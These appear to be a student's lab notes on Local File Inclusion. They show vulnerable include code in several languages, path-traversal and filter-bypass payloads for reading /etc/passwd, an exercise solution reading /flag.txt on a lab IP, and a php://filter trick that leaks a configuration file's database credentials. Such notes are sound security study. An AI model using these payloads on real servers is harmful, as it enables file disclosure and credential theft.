`Backend Languages`
* PHP
* Javascript
* Java

### Local File Inclusion (LFI)
Commonly found in templating engines.
* Header
* Navigation Bard
* Footer
# PHP
`include()` loads a local or remote file to the page.
```php
if (isset($_GET['language'])) { 
	include($_GET['language']); 
}
```

Others being
```php
include_once()
require()
require_once()
file_get_contents()
```

Basic example of how GET parameter language is used to control what is written to a page.
```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
 // Determines how language parameter is used in the about page
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```
```jsp
The import function may be used to render a local file or url
<c:import url= "<%= request.getParameter('language') %>"/>
```
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) { <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> }
```

# Basic LFI
```bash
http://IP:port/index.php

# Then for spanish
http://IP:port/index.php?lanuage=es.php

# But what about
http://IP:port/index.php?language=/etc/passwd
```

## Path Traversal
```php
include($_GET['language']);

# If this errors then doing ../../ to get to the root dir might
'http://IP:port/index.php?language=/etc/passwd'

'http://IP:port/index.php?language=../../../../../etc/passwd'

# or Applying a prefix
'http://IP:port/index.php?language=/../../../../etc/passwd'

# Recursive
'http://IP:port/index.php?language=....//....//....//....//etc/passwd'

# Encoding using Burpsuite encoder
'../../../etc/passwd' put into the encoder

# Approved Paths something like
'language=./language/../../../etc/passwd'
```

# Exercise
`The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt`

1. `http://154.57.164.82:30113/index.php?language=languages/es.php`
2. `http://154.57.164.82:30113/index.php?language=./languages/../../../../../etc/passwd` (Illegal Path)
3. `http://154.57.164.82:30113/index.php?language=languages/....//....//....//....//....//....//....//etc/passwd`
4. Final `/....//....//....//....//....//....//....//flag.txt`

# PHP Fuzzing
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

# From this found both index.php and configure.php
'http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=configure'

# The taking the string and doing a base64 -d was able to get the database information.
```